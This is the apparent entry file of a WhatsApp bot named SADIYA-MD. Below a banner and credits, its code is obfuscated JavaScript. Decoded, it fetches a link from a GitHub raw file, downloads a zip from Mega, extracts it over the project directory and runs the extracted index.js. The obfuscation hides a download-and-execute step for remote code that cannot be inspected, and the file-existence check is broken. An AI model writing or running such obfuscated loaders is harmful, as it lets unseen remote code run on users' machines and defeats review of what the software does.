/**
══════════════════════════════════════════════════════════════════════════════════════════════════════

░██████╗░█████╗░██████╗░██╗██╗░░░██╗░█████╗░░░░░░███╗░░░███╗██████╗░ 
██╔════╝██╔══██╗██╔══██╗██║╚██╗░██╔╝██╔══██╗░░░░░████╗░████║██╔══██╗ 
╚█████╗░███████║██║░░██║██║░╚████╔╝░███████║░░░░░██╔████╔██║██║░░██║ 
░╚═══██╗██╔══██║██║░░██║██║░░╚██╔╝░░██╔══██║░░░░░██║╚██╔╝██║██║░░██║ 
██████╔╝██║░░██║██████╔╝██║░░░██║░░░██║░░██║░░░░░██║░╚═╝░██║██████╔╝ 
╚═════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░░╚═╝░░░╚═╝░░╚═╝░░░░░╚═╝░░░░░╚═╝╚═════╝░ 

══════════════════════════════════════════════════════════════════════════════════════════════════════
*
   * @project_name : SADIYA-MD
   * @creator : Sadiya Tech
   * @youtube : https://www.youtube.com/@Sadiya-Tech
   * @description : SADIYA-MD ,Javascript WhatsApp Bot Made By Sadiya Tech.
*
* 
   * Created By Sadiya Tech.
   * © 2025 SADIYA-MD .
*/

const _0x274448=_0x5bcb;function _0x5bcb(_0x38490d,_0x923b2f){const _0x4c33a3=_0x4c33();return _0x5bcb=function(_0x5bcbdd,_0x23f65a){_0x5bcbdd=_0x5bcbdd-0xf1;let _0x13ea37=_0x4c33a3[_0x5bcbdd];return _0x13ea37;},_0x5bcb(_0x38490d,_0x923b2f);}(function(_0x10c5d7,_0x436315){const _0x106397=_0x5bcb,_0x5f479e=_0x10c5d7();while(!![]){try{const _0x5599a5=parseInt(_0x106397(0x111))/0x1*(parseInt(_0x106397(0xf3))/0x2)+parseInt(_0x106397(0x100))/0x3*(-parseInt(_0x106397(0xf1))/0x4)+-parseInt(_0x106397(0xf5))/0x5+parseInt(_0x106397(0x10b))/0x6*(parseInt(_0x106397(0x103))/0x7)+parseInt(_0x106397(0xf7))/0x8+parseInt(_0x106397(0x104))/0x9*(parseInt(_0x106397(0x10f))/0xa)+-parseInt(_0x106397(0xfb))/0xb*(parseInt(_0x106397(0x10d))/0xc);if(_0x5599a5===_0x436315)break;else _0x5f479e['push'](_0x5f479e['shift']());}catch(_0x42abe4){_0x5f479e['push'](_0x5f479e['shift']());}}}(_0x4c33,0x73810));function _0x4c33(){const _0x50b073=['⏩\x20Skip\x20download\x20main\x20file','/index.js','/config.js','log','downloadBuffer','mega_zip','570PtKbDJ','axios','112740yKYpjy','existsSync','900spSRmC','message','1WDujxH','megajs','188MHeIkp','/plugins','1632010dzpDlv','exit','1667575pHqHHf','adm-zip','2494928ZIezuQ','/refs/heads/main/mega_zip.json','writeFileSync','error','539GduYXl','An\x20error\x20occurred:','unlinkSync','temp.zip','❌\x20Error\x20during\x20download\x20and\x20extraction:','4863iLdRIV','extractAllTo','./index.js','11228jwbFvf','6291vcOjdw'];_0x4c33=function(){return _0x50b073;};return _0x4c33();}const fs=require('fs'),path=require('path'),{File}=require(_0x274448(0x112)),AdmZip=require(_0x274448(0xf6)),axios=require(_0x274448(0x10c)),db_repo='https://raw.githubusercontent.com/tech14555/db',ZIP_DIR='./';async function downloadAndExtractZip(){const _0x182ae8=_0x274448;try{const _0x3c8e6d=await axios['get'](db_repo+_0x182ae8(0xf8)),_0x2a8d87=_0x3c8e6d['data'][_0x182ae8(0x10a)],_0x8c41ee=File['fromURL'](_0x2a8d87),_0x1aed25=await _0x8c41ee[_0x182ae8(0x109)](),_0x73a330=path['join'](__dirname,_0x182ae8(0xfe));fs[_0x182ae8(0xf9)](_0x73a330,_0x1aed25);const _0x504c75=new AdmZip(_0x73a330);_0x504c75[_0x182ae8(0x101)](ZIP_DIR,!![]),fs[_0x182ae8(0xfd)](_0x73a330),console['log']('Main\x20downloaded\x20successfully\x20✅');}catch(_0x8a1e4e){console['error'](_0x182ae8(0xff),_0x8a1e4e[_0x182ae8(0x110)]),process[_0x182ae8(0xf4)](0x1);}}const main=async()=>{const _0x503165=_0x274448;try{!fs[_0x503165(0x10e)](__dirname+'/lib'||_0x503165(0xf2)||_0x503165(0x106)||_0x503165(0x107))?await downloadAndExtractZip():console[_0x503165(0x108)](_0x503165(0x105)),require(_0x503165(0x102));}catch(_0x562a56){console[_0x503165(0xfa)](_0x503165(0xfc),_0x562a56[_0x503165(0x110)]);}};main();